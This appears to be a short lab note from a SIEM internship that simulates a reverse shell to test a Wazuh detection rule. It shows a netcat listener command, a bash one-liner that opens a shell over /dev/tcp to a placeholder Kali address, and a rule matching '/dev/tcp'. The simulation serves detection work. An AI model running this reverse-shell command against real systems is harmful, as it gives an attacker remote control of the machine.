# Command and Control (C2) Traffic Detection (Reverse Shell)

**Simulate with Netcat:**

**On Kali:**

    nc -lvnp 5555

**On Ubuntu:**

    bash -i >& /dev/tcp/<kali-ip>/5555 0>&1
________________________________________
**Wazuh rule:**

    <rule id="101400" level="15">
      <match>/dev/tcp</match>
      <description>Possible reverse shell detected</description>
      <mitre>
        <id>T1071</id>
        <id>T1059</id>
      </mitre>
    </rule>
The Restart the wazuh 

# Proof-Of-Concept 

![Reverse Shell](https://github.com/Gagancybersec01/SIEM-Internship-Phase-1/blob/f07bcdca56b0a658124ed1186b31757962f2c787/Screenshots/Reverse-Shell.png)




